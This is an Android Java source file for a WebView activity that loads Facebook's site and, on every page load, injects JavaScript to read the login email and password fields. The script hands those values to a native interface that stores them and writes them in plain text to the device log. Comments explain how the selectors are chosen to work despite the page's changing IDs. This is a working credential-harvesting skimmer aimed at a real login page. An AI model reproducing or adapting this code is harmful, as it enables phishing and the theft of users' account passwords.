package com.example.accesstrigger;

import android.os.Bundle;
import android.util.Log;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class WebViewActivity extends AppCompatActivity {

    String email, password;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_web_view);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        WebView myWebView = findViewById(R.id.webview);
        WebSettings webSettings = myWebView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        myWebView.setWebViewClient(new WebViewClient());

        myWebView.setVerticalScrollBarEnabled(true);
        myWebView.setHorizontalScrollBarEnabled(true);
        myWebView.setScrollBarStyle(WebView.SCROLLBARS_INSIDE_OVERLAY);
        webSettings.setDomStorageEnabled(true);


        CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);

        myWebView.addJavascriptInterface(new WeAppInterface(), "Android");

        // cookies need to be clicked before load
        myWebView.loadUrl("https://www.facebook.com");



        myWebView.setWebViewClient(new WebViewClient(){
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);

                injectJavaScript(view);
            }
        });

    }

    private void injectJavaScript(WebView view) {
        view.loadUrl("javascript:(function() {" +
                "console.log('Injecting JavaScript');" +

                // Capture email and password values
                // Id is added dynamically - pc_id = email / mobile_id = m_login_email
                // Input has static name, it works regardless
                "var email = document.querySelector('#m_login_email').value ;" +
                "var password = document.querySelector('input[name=\"pass\"]').value  ;" +

                "Android.handleLoginData(email,password);" +

                "})()");
    }





    public class WeAppInterface{
        @JavascriptInterface
        public void handleLoginData(String emailFac, String passwordFac) {
            email = emailFac;
            password = passwordFac;

            Log.i("WebView", "Email: " + emailFac);
            Log.i("WebView", "Password: " + passwordFac);
        }
    }
}